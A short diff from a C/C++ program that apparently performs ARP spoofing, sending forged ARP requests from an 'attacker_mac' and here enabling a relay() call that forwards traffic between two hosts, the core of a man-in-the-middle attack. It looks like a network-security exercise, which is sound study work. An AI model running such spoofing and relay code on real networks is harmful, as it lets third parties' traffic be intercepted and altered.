@@ -71,7 +71,7 @@ int main(int argc, char *argv[])
 	request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
 	// request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, htons(ArpHdr::Reply));
 	// request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, htons(ArpHdr::Reply));
-	// relay(dev, pcap, attacker_mac, sender_mac, target_mac, sender_ip, target_ip);
+	relay(dev, pcap, attacker_mac, sender_mac, target_mac, sender_ip, target_ip);
 
 	// ArpInfo *arp_info;
 	// arp_info = (ArpInfo *)malloc(sizeof(ArpInfo));
